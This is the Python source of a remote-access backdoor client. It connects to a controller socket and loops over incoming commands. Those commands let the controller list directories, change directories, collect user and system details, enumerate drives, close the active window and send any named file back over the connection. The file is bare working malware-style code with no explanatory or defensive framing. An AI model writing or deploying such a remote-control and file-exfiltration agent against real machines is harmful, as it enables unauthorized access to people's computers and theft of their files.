import getpass
import os
import platform
import socket
import subprocess
from time import sleep
import colorama
import pyautogui
from colorama import Fore, Style

colorama.init()

HOST = '127.0.0.1'
PORT = 8080

s = socket.socket()
s.connect((HOST, PORT))
while True:
    client = f"""
            {Fore.RED}{getpass.getuser()}({platform.node()}{Style.RESET_ALL}):{Fore.LIGHTBLUE_EX}{os.getcwd()}"""
    s.send(client.encode())
    command = s.recv(1024).decode()
    if command == 'ls':
        s.send(str(os.listdir(".")).encode())
    elif command == 'ipaddr':
        ip = socket.gethostbyname(socket.gethostname())
        s.send(ip.encode())
    elif command == 'cwd':
        s.send(f"current working directory is:{os.getcwd().encode()}".encode())
    elif command == 'main':
        current = list(os.getcwd())
        drive = str(current[2])
        s.send(drive.encode())
        os.chdir(drive)
    elif command.split(" ")[0] == "download":
        with open(command.split(" ")[1], "rb") as f:
            file_data = f.read(1024)
            while file_data:
                print("Sending", file_data)
                s.send(file_data)
                file_data = f.read(1024)
            sleep(2)
            s.send(b"DONE")
        print("Finished sending data")
    elif command.split(" ")[0] == "cd":
        os.chdir(command.split(" ")[1])
        s.send("Changed directory to {}".format(os.getcwd()).encode())
    elif command == 'sysinfo':
        info = f"""
                {Fore.MAGENTA}OS(Operating System):{Fore.YELLOW}{platform.system()}
                {Fore.MAGENTA}Computer Name:{Fore.YELLOW}{platform.node()}
                {Fore.MAGENTA}UserName:{Fore.YELLOW}{getpass.getuser()}
                {Fore.MAGENTA}Release Version:{Fore.YELLOW}{platform.version()}
                {Fore.MAGENTA}Processor:{Fore.YELLOW}{platform.processor()}
                {Fore.MAGENTA}Processor Architecture:{Fore.YELLOW}{platform.architecture()}
                    """
        s.send(info.encode())
    elif command == 'exit':
        s.send(b'Exiting')
        break
    elif command == 'drives':
        drives = subprocess.run(["fsutil", "fsinfo", "drives"], capture_output=True).stdout.decode()
        str(drives)
        s.send(drives.encode())
    elif command == 'screen_size':
        screen_size = pyautogui.size()
        screen_size = str(screen_size)
        s.send(screen_size.encode())
    elif command == 'close':
        pyautogui.hotkey('alt', 'f4')
        s.send(b"Application closed")
